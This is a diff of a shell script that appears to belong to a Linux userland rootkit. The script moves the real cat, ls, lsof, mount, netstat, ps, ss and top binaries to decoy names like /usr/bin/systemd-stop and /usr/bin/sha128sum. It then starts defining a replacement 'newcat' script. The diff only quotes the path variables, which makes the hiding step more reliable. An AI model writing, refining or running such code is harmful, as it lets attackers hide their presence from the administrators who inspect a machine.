@@ -8,14 +8,14 @@ ps_path=`which ps`
 ss_path=`which ss`
 top_path=`which top`
 
-mv $cat_path /usr/bin/systemd-stop
-mv $ls_path /usr/bin/pbmtoaw
-mv $lsof_path /usr/bin/pbmtoget
-mv $mount_path /usr/bin/zipfind
-mv $netstat_path /usr/bin/ziplist
-mv $ps_path /usr/bin/watchgnome
-mv $ss_path /usr/bin/traceroute-list
-mv $top_path /usr/bin/sha128sum
+mv "$cat_path" /usr/bin/systemd-stop
+mv "$ls_path" /usr/bin/pbmtoaw
+mv "$lsof_path" /usr/bin/pbmtoget
+mv "$mount_path" /usr/bin/zipfind
+mv "$netstat_path" /usr/bin/ziplist
+mv "$ps_path" /usr/bin/watchgnome
+mv "$ss_path" /usr/bin/traceroute-list
+mv "$top_path" /usr/bin/sha128sum
 
 newcat='
 #!/bin/bash
